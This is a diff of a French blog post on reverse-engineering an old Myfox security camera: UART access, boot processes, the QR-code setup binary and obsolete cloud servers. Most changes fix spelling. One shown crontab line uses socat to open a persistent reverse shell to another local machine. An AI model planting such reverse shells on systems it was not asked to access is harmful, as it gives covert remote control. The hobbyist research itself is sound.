@@ -3,22 +3,21 @@ title: "Caméra Myfox"
 date: 2025-11-29
 tags: ["hardware"]
 categories: ["Research"]
-image: /blog/images/
 description: "Rétro-ingénierie d'une vieille caméra myfox.  "
 ---
 
 ## Introduction
 
-J'ai trouvé uen vieille caméra dans le garage de mon père. Et comme je n'avais jamais vraiment fais de hardware, j'ai trouvé que c'était une bonne idée d'y jetter un coup d'oeil.
+J'ai trouvé une vieille caméra dans le garage de mon père. Et comme je n'avais jamais vraiment fait de hardware, j'ai trouvé que c'était une bonne idée d'y jeter un coup d'œil.
 
 ## Boot
 
 Après avoir enlevé le couvercle de la caméra, grâce au blog post [suivant](https://arthur.lutz.im/blog/2020/04/13/demontage-myfox-security-camera-part-2/), on peut accéder au PCB et on voit les pins RX et TX.
 
-![[/blog/images/myfox1.png]]
+![Photo du hardware](/blog/images/myfox1.png)
 
-Ceux-ci ne sont difficilement soudable, il faut donc utiliser un setup un peu louche pour pouvoir se connecter en UART à la device.
-![[/blog/images/myfox2.png]]
+Ceux-ci sont difficilement soudables, il faut donc utiliser un setup un peu louche pour pouvoir se connecter en UART à la device.
+![Photo de l'installation UART](/blog/images/myfox2.png)
 
 Une fois bien branché, on voit les logs de boot du kernel et on obtient un prompt d'authentification.
 
@@ -48,7 +47,7 @@ On reboot, et on obtient un shell.
 
 ## Processes
 
-En regardant les process lancés au démarrage, la suite de processes suivante semble lancer un binaire `qrcode`.
+En regardant les process lancés au démarrage, la liste de processus suivante semble lancer un binaire `qrcode`.
 
 ```
 root       297  0.0  0.5   3560   700 ?        S    21:37   0:00 /bin/sh /usr/local/LeCam/bin/stream_watchdog.sh start
@@ -63,9 +62,9 @@ root       675 42.1  1.5   6736  2148 ?        R    21:37   6:50                
 
 ```
 
-C'est plutôt intéréssant, en sachant que pour synchroniquer notre caméra à l'installation on passe par un qrcode.
+C'est plutôt intéressant, en sachant que pour synchroniser notre caméra à l'installation on passe par un qrcode.
 
-Une fois le qrcode scanner on obtient l'arbre suivant:
+Une fois le qrcode scanné on obtient l'arbre suivant:
 
 ```
 root       312  0.0  0.5   3560   672 ?        S    16:50   0:00 /bin/sh /usr/local/LeCam/bin/watchdog.sh LeCam
@@ -84,7 +83,7 @@ Puis notre device est connectée au wifi:
     inet 192.168.1.115/24 brd 192.168.1.255 scope global wlan0
 ```
 
-Maintenant plus besoin de shell via UART. On install une crontab qui lance un reverse shell vers une autre machine et c'est bon.
+Maintenant plus besoin de shell via UART. On installe une crontab qui lance un reverse shell vers une autre machine et c'est bon.
 
 ```
 ~ # crontab -l
@@ -94,9 +93,9 @@ Maintenant plus besoin de shell via UART. On install une crontab qui lance un re
 /root/socat exec:'/bin/sh',pty,stderr,sigint tcp:192.168.1.21:4445
 ```
 
-Mais la LED est rouge et l'application nous dit que la device n'a pas pu être connecté ...
+Mais la LED est rouge et l'application nous dit que la device n'a pas pu être connectée ...
 
-En lancant le binaire `LeCam` manuellement je me suis rendu compte que les serveurs liés à ce produit était obsolète.
+En lançant le binaire `LeCam` manuellement je me suis rendu compte que les serveurs liés à ce produit sont obsolètes.
 
 ```
 ~ # /usr/local/LeCam/bin/LeCam help
@@ -138,9 +137,9 @@ Process has exit!
 
 ```
 
-En effet l'entreprise à été racheté depuis et le produit à été refondé.
+En effet l'entreprise à été rachetée depuis et le produit à été refondue.
 
-Le fichier de conf suivant est utilisé notament pour faire des mises à jour.
+Le fichier de conf suivant est utilisé notamment pour faire des mises à jour.
 
 ```
 ~ # cat /usr/local/LeCam/bin/cloud.ini
@@ -166,13 +165,14 @@ argus_server_ip = argus.closeli.com
 
 Au final on ne peut pas aller plus loin dans la recherche...
 
-J'ai commencé à reverse le soft, mais comment les serveurs sont down ca n'a pas grand intérêt.
+J'ai commencé à reverse le soft, mais comme les serveurs sont down ça n'a pas grand intérêt.
 
-La partie 2 du post pourrait être un projet pour rendre à mouveau fonctionnel cette caméra ?
+La partie 2 du post pourrait être un projet pour rendre à nouveau fonctionnel cette caméra ?
 
 ---
 
 ## References
 
 https://github.com/santeri3700/opticam_o8_hacking
+
 https://arthur.lutz.im/blog/2020/04/13/demontage-myfox-security-camera-part-2/
